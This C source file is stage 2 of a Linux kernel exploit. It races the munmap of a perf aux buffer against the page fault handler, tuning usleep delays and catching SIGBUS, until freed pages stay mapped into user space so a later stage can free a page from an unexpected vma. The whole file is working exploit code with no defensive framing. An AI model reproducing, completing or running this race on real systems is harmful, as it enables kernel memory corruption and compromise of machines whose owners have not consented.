#include "exploit.h"
#include <stdint.h>
#include <string.h>

/* Stage 2
* This exploit stage performs a race between the unmapping of an aux buffer and the page fault handler accessing the
* array of pages.
* If the race is won a range of pages that have been returned to the page allocator are going to be mapped in user space.
* This mapping is read only, but it allows freeing a page from an unexpected vma.
*/

static void sigbus_handler(int signum, siginfo_t* si, void* arg)
{
    if(signum == SIGBUS)
    {
        ucontext_t *ctx = (ucontext_t*)arg;
        global_exp_data->stage2.caught_sigbus = 1;
        ctx->uc_mcontext.gregs[REG_RIP]+=3; //Skip size of the assembly load operation
    }
}

void* stage2_parent(void* args)
{
    struct exp_sync_stage2 *exp_data = &global_exp_data->stage2;
    exp_data->mapped = 0;
    int perf_fd = (int)(uint64_t)args;
    printf("[P] Unmap Started\n");
    while(!exp_data->race_done)
    {
        race_barrier_wait(&exp_data->rdy_barrier);
        void* mmap_aux = mmap(0, TARGET_AUX_UNMAP_SIZE, PROT_READ|PROT_WRITE,MAP_SHARED, perf_fd, TARGET_AUX_OFFSET);
        if(mmap_aux==MAP_FAILED)
        {
            perror("[P] mmap\n");
            printf("[P] mmap err\n");
            exp_data->mapped = 1;
            race_barrier_wait(&exp_data->result_barrier);
            continue;
        }
        exp_data->mapped = 1;
        if(exp_data->usec_delay<0)
            usleep(-exp_data->usec_delay);
        else
            usleep(0);
        munmap(mmap_aux, TARGET_AUX_UNMAP_SIZE);
        exp_data->mapped = 0;
        race_barrier_wait(&exp_data->result_barrier);
    }
    return NULL;
}

void* stage2_child(void* args)
{
    struct sigaction sa;
    memset(&sa,0, sizeof(sa));
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = sigbus_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGBUS,&sa, NULL);

    struct exp_sync_stage2 *exp_data = &global_exp_data->stage2;
    int perf_fd2 = (int)(uint64_t)args;
    exp_data->caught_sigbus = 0;
    exp_data->usec_delay = RACE_DELAY_AVG;
    printf("[C] Unmap Fault Started\n");
    while(!exp_data->race_done)
    {
        race_barrier_wait(&exp_data->rdy_barrier);
        while(!exp_data->mapped)
            ;//Busy
        exp_data->mapped = 0;
        if(exp_data->usec_delay>0)
            usleep(exp_data->usec_delay);
        else
            usleep(0);

        void* mmap_aux2 = (void*)exp_data->extra_vma;
        //Target aux size is smaller than unmap size
        void* mmap_aux_end = mmap_aux2+TARGET_AUX_SIZE-PAGE_SIZE;
        void* mmap_aux_curr = mmap_aux_end;

        mmap_aux2 += RACE2_SAFETY_BUFFER_SIZE;
        //Search backwards from last backed page forward
        for(;mmap_aux_curr>=mmap_aux2; mmap_aux_curr-=PAGE_SIZE)
        {
            char test = *(volatile char*)mmap_aux_curr;
            if(exp_data->caught_sigbus)
            {
                break;
            }
        }
        //If we immediately caught sigbus, we are too late
        if(exp_data->caught_sigbus && mmap_aux_curr==mmap_aux_end)
        {
            //Lost, reset the sigbus flag and adjust offset
            exp_data->caught_sigbus = 0;
            exp_data->usec_delay-=RACE2_STEP_SIZE;

            if(exp_data->usec_delay<=exp_data->usec_delay_min-1)
            {
                exp_data->race_done = 1;
                race_barrier_wait(&exp_data->result_barrier);
                return NULL;
            }
            race_barrier_wait(&exp_data->result_barrier);
            continue;
        }
        //We accessed at least some pages
        //Since we are gradually decreasing the delay assume we are never
        //too early by so much that we would have grabbed all pages
        
        printf("[C] Won stage 2 race\n");
        size_t correction = 0;
        //If we caught sigbus the last page we tried to access wasn't valid anymore
        if(exp_data->caught_sigbus)
        {
            printf("[C] Caught sigbus, correcting offset\n");
            correction = PAGE_SIZE;
        }
        exp_data->mapped_start = mmap_aux_curr+correction;
        exp_data->mapped_end = mmap_aux_end+PAGE_SIZE;
        exp_data->race_done = 1;
        exp_data->success = 1;
        race_barrier_wait(&exp_data->result_barrier);
        return NULL;
    }
}